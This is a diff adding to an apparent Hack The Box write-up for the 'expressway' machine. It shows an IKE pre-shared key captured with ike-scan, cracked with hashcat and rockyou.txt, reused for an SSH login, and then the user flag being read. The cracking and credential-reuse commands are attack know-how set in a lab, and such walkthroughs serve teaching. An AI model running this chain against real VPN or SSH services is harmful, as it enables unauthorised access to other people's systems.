@@ -155,3 +155,32 @@ sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
 ```
 - `--id`: Specifies the identity to use in our request.
 - `-P<file>`: Saves the PSK cracking parameters to the specified file.
+
+Just use any hash cracking tool to crack ike.psk i am using hashcat
+
+```bash
+hashcat ike.psk /usr/share/wordlists/rockyou.txt
+```
+
+We found the password
+
+![[2.png]]
+
+Lets use these creds to check if we can log in via SSH
+
+```bash
+ssh ike@expressway.htb
+```
+
+We got in!!
+![[3.png]]
+Lets grab the user flag
+## User flag
+
+```bash
+cat user.txt
+```
+
+```bash
+7b354d{Redacted}25c0ce
+```
